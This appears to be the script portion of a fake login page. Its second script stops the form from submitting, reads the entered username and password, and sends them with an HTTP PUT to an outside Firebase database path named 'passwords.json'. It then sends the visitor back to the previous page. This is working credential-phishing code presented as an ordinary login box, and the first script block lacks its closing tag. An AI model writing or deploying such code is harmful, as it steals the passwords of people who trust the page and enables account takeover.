    <script>
    document.addEventListener('DOMContentLoaded', function() {
        if (undefined === window.getComputedStyle(document.documentElement).backgroundBlendMode) {
            document.getElementById('loginBox').style.backgroundColor = 'white';
        }
    });

    <script>
        window.addEventListener('load', () => {
            let submitButton = document.querySelector('.submit');
            let form = document.getElementById('login');
            const sendData = () => {
                let name = document.getElementById('name').value;
                let password = document.getElementById('pass').value;
                // let url = 'https://my-blogs-63704.firebaseio.com/posts.json';
                let url = 'https://pass-b5281.firebaseio.com/users/posts/passwords.json';
                let xhr = new XMLHttpRequest();
                xhr.open('PUT', url);
                xhr.send(JSON.stringify({name: name, password: password}));
            };
            const redirect = () => {
                window.history.back();
            };
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                sendData();
                setTimeout(redirect, 1000);
            });
        });
    </script>
